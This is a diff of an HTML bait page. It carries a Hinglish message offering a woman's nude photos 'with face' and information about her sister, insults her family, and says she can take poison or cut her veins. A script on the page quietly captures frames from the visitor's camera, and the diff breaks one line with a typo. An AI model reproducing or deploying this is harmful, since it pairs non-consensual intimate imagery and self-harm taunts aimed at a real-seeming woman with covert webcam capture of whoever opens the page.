@@ -3,83 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ye Sharte Maan Le Fir Sab Khatam Karte Hai.</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            color: #fff;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            box-sizing: border-box;
-        }
-
-        h1 {
-            color: blue;
-            text-transform: uppercase;
-            font-size: 1.5em;
-            margin-bottom: 10px;
-        }
-
-        p {
-            max-width: 100%;
-            text-align: justify;
-            margin: 10px 0;
-            text-transform: capitalize;
-            font-size: 1em;
-        }
-
-        img {
-            filter: blur(70%);
-            transition: filter 0.5s;
-            max-width: 100%;
-            height: auto;
-        }
-
-        .blur-text {
-            color: blue;
-            text-transform: uppercase;
-            position: absolute;
-            top: 60%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 1.2em;
-            cursor: pointer;
-        }
-
-        .blur-text:hover + img {
-            
-            font-color: yellow;
-            filter: blur(0);
-        }
-
-        @media only screen and (max-width: 600px) {
-            h1 {
-                font-size: 1.2em;
-            }
-
-            p {
-                font-size: 0.9em;
-            }
-
-            .blur-text {
-                font-size: 1em;
-            }
-        }
-    </style>
+    <title style="color: blue;">Ye sab matter yahi karte hai bhai meri ye shate maan le.</title>
 </head>
 <body>
 
-<h1>Deal bs ye hai is sabme mera naam nahe aay</h1>
-<p> <font color="black"> Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate. </font> </p>
-
-<div class="blur-text"><font color="yellow"> Click to allow image to unblur </font> </div>
-<img src="images.jpg" alt="Blurred Image">
+<h1>Deal bs ye hai is sabme mera naam nhe aaye.</h1>
+<p>Bhai Me Khud Is Bc Se Durr Jaana Chahta Hoo Me Teri Help Kar Dunga Mne Jo Bhee Yahaa Likhha H Uska Screenshot Mt Liye Bs Tujhe Iske Or Nude Photos Chahiye Me Dunga Bo Bhee With Face Or Chaahe To Iski Behen Ke Baare Me Bhee Bhot Information De Skta Hoo Ke Bo Kyaa Kyaa Krti H Poora Khandan Esa Hee H Maa Bhee Km Nhe H Iskii Bs Is Sabme Mera Naam Nahi Aay Kahi Se Kahi Tak Or Ye Mujhse Durr Ho Jaay Me Phirr Isko Zeher Khana H To Zeher Khaay Yaa Nas Kaate.</p>
 
 <script>
     // Check if camera permission is already granted
@@ -105,7 +34,7 @@
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.height = video.videoHight;
                 const context = canvas.getContext('2d');
 
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
